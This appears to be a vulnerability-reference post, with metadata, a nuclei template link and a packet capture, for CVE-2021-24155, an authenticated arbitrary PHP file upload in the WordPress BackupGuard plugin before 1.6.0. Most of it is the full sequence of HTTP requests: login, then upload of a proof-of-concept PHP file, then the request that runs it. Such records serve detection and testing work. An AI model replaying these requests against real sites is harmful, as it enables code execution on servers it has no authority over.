---
layout: "post"
cve_id: "CVE-2021-24155"
title: "WordPress BackupGuard <1.6.0 - Authenticated Arbitrary File Upload"
pcap: true
pcap_path: "/pcaps/2021/CVE-2021-24155.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-24155.yaml"
author: "theamanrawat"
severity: "high"
impact: "Remote code execution
"
remediation: "Fixed in version 1.6.0."
reference:
  - "https://wpscan.com/vulnerability/d442acac-4394-45e4-b6bb-adf4a40960fb"
  - "https://wordpress.org/plugins/backup/"
  - "https://nvd.nist.gov/vuln/detail/CVE-2021-24155"
  - "http://packetstormsecurity.com/files/163382/WordPress-Backup-Guard-1.5.8-Shell-Upload.html"
  - "https://github.com/0dayNinja/CVE-2021-24155.rb"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 7.2, 'cve-id': 'CVE-2021-24155', 'cwe-id': 'CWE-434', 'epss-score': 0.93251, 'epss-percentile': 0.9979, 'cpe': 'cpe:2.3:a:backup-guard:backup_guard:*:*:*:*:*:wordpress:*:*'}"
metadata: "{'verified': True, 'max-request': 4, 'vendor': 'backup-guard', 'product': 'backup_guard', 'framework': 'wordpress'}"
tags:
  - "cve"
  - "cve2021"
  - "authenticated"
  - "wp"
  - "packetstorm"
  - "wp-plugin"
  - "rce"
  - "wordpress"
  - "backup"
  - "wpscan"
  - "intrusive"
  - "backup-guard"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
WordPress Backup Guard plugin before 1.6.0 is susceptible to authenticated arbitrary file upload. The plugin does not ensure that imported files are in SGBP format and extension, allowing high-privilege users to upload arbitrary files, including PHP, possibly leading to remote code execution.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Connection: close
Content-Length: 38
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

log=HcTqV4&pwd=6mWB09&wp-submit=Log+In
```

```nohighlight
GET /wp-admin/admin.php?page=backup_guard_backups HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-admin/admin-ajax.php?action=backup_guard_importBackup&token=uplYzm HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-us) AppleWebKit/534.16+ (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4
Connection: close
Content-Length: 292
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: multipart/form-data; boundary=---------------------------204200867127808062083805313921
Accept-Encoding: gzip

-----------------------------204200867127808062083805313921
Content-Disposition: form-data; name="files[]"; filename="38BpwbkFnoQmtn0fIvBKNd7mUO5.php"
Content-Type: application/x-php

<?php

echo "CVE-2021-24155";

?>

-----------------------------204200867127808062083805313921--
```

```nohighlight
GET /wp-content/uploads/backup-guard/38BpwbkFnoQmtn0fIvBKNd7mUO5.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

